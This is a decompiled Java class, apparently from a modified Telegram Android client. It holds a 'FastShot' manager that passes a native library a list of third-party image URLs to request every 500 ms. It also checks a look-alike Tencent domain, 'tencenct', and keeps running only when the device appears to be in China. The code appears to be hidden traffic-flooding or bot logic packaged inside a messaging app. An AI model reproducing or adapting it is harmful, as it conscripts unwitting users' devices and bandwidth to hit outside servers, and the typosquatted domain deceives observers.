package org.telegram.ui;

import android.text.TextUtils;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.json.JSONObject;
import org.telegram.messenger.BuildVars;
import polib.Polib;

/* loaded from: classes3.dex */
public class JMTFastShotManager {
    private static volatile JMTFastShotManager instance;
    private boolean isChina = true;
    private final OkHttpClient okHttpClient;

    public static JMTFastShotManager getInstance() {
        if (instance == null) {
            synchronized (JMTFastShotManager.class) {
                if (instance == null) {
                    instance = new JMTFastShotManager();
                }
            }
        }
        return instance;
    }

    public JMTFastShotManager() {
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        this.okHttpClient = builder.connectTimeout(2L, timeUnit).writeTimeout(2L, timeUnit).readTimeout(2L, timeUnit).build();
        JsonObject jsonObject = new JsonObject();
        JsonArray jsonArray = new JsonArray();
        jsonArray.add("http://1.30.8.153:8088/images/yeastar.ico");
        jsonArray.add("http://1.15.81.219:8088/static/common/images/icon-play.png");
        jsonArray.add("http://1.58.219.129:8088/source?get=Vesn%20Data.gif");
        jsonArray.add("http://27.151.172.32:8088/dist/OEM/GOCLOUD/favicon.ico");
        jsonArray.add("http://szcp.mxdx.net:8088/cache/suzhiceping_exe/n3/res/__A406AAA462DF6EEC06E61D67.png");
        jsonArray.add("http://bit.909321.xyz:8088/static/img/icons/favicon-32x32.png");
        jsonArray.add("http://1.15.89.53:8088/Content/img/login-input-icon.png");
        jsonArray.add("http://1.117.189.122:8088/TruckMng/Content/Images/dsico.ico");
        jsonObject.add("urlList", jsonArray);
        jsonObject.addProperty("intervalMs", (Number) 500);
        jsonObject.addProperty("randomNum", (Number) 20);
        jsonObject.addProperty("debug", Boolean.FALSE);
        if (BuildVars.isOpenFireFastShot) {
            Polib.init(jsonObject.toString());
        }
    }

    public void startCountry() {
        new Thread(new Runnable() { // from class: org.telegram.ui.JMTFastShotManager.1
            @Override // java.lang.Runnable
            public void run() {
                try {
                    JMTFastShotManager.this.okHttpClient.newCall(new Request.Builder().url("http://console.cloud.tencenct.com:9999").build()).enqueue(new Callback() { // from class: org.telegram.ui.JMTFastShotManager.1.1
                        @Override // okhttp3.Callback
                        public void onFailure(Call call, IOException iOException) {
                        }

                        @Override // okhttp3.Callback
                        public void onResponse(Call call, Response response) throws IOException {
                            try {
                                if (response.isSuccessful()) {
                                    String string = response.body().string();
                                    if (TextUtils.isEmpty(string)) {
                                        return;
                                    }
                                    JSONObject jSONObject = new JSONObject(string);
                                    JMTFastShotManager.this.isChina = jSONObject.optBoolean("isChina");
                                    if (JMTFastShotManager.this.isChina) {
                                        return;
                                    }
                                    JMTFastShotManager.this.stopFastShot();
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public void startFastShot() {
        if (this.isChina && BuildVars.isOpenFireFastShot) {
            Polib.start();
        }
    }

    public void stopFastShot() {
        if (BuildVars.isOpenFireFastShot) {
            Polib.stop();
        }
    }
}
